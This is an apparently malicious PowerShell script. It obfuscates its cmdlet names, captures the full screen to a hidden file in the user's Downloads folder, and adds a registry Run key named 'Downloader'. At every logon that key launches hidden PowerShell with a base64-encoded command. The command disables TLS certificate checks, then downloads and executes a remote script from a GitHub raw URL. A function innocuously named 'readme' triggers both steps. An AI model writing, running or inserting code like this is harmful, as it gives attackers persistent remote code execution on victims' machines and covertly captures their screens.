function Invoke-ScreenCapture
{

	$RandomFileName = [System.IO.Path]::GetRandomFileName();
	$Filepath="$env:USERPROFILE\Downloads\$RandomFileName.bmp";
	aDD-T`Y`PE -AssemblyName System.Windows.Forms;
	adD`-t`YpE -AssemblyName System.Drawing;
	$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;
	$Width = $Screen.Width;
	$Height = $Screen.Height;
	$Left = $Screen.Left;
	$Top = $Screen.Top;
	$bitmap = nEW`-ObJ`ecT System.Drawing.Bitmap $Width, $Height;
	$graphic = [System.Drawing.Graphics]::FromImage($bitmap);
	$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size);
	$bitmap.Save($Filepath);

}

function Registry_Runkey{

	New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "Downloader" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -bypass -hidden -enc WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzACAALQBiAG8AcgAgAFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAxACAALQBiAG8AcgAgAFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACAAJAB1AHIAbAA9ACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBkAG8AdQB3AGEAbgBoAHUALwBhAHUAdABvAC0AaQBuAHMAdABhAGwAbAAvAG0AYQBzAHQAZQByAC8AcgBlAGEAZABtAGUALgBwAHMAMQAiADsAIAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAIABJAEUAWAAoACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJAB1AHIAbAApACkAOwA=" -Force

}

function readme{

	Registry_Runkey
	Invoke-ScreenCapture
}
readme